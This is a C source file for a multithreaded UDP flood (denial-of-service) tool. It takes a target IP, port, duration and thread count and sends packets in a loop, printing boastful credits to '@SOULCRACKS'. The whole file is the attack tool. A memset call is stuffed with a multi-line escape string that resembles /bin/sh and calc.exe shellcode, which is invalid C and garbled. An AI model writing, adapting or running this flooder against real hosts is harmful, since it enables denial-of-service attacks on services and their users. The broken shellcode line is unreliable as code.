#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PAYLOAD_SIZE 1024

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    memset(payload, '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60
\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b
\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x8b\x93\x88\x00\x00
\x00\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d
\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x00\x50
\x48\x89\xe0\x48\x83\xc4\x08\xeb\x00\x67\xe3\x19\x31\xdb\x41\x8b
\x1c\x8b\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b\x74\x02
\x75\xe7\x51\xeb\x01\xcc\x41\x5f\x78\x00\x4c\x89\xf9\x4d\x31\xdb
\x44\x8b\x5a\x24\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d
\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x43\x8b\x04\xab\x4c\x01\xc0
\x50\x78\x00\x41\x5f\xb8\x00\x00\x00\x00\x50\x48\xb8\x63\x61\x6c
\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\xba\x01\x00\x00\x00\x48\x83
\xec\x30\x41\xff\xd7a', PAYLOAD_SIZE - 1);
    payload[PAYLOAD_SIZE - 1] = '\0';

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return 1;
    }

    AttackParams params;
    strcpy(params.ip, argv[1]);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    int max_threads = atoi(argv[4]);

    pthread_t threads[max_threads];

    printf("MADE BY @SOULCRACKS %s:%d for %d seconds with %d threads...\n",
           params.ip, params.port, params.duration, max_threads);

    for (int i = 0; i < max_threads; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < max_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("FUCKED ATTACK @SOULCRACKS HOST IP %s on port %d for %d seconds\n",
           params.ip, params.port, params.duration);

    return 0;
}
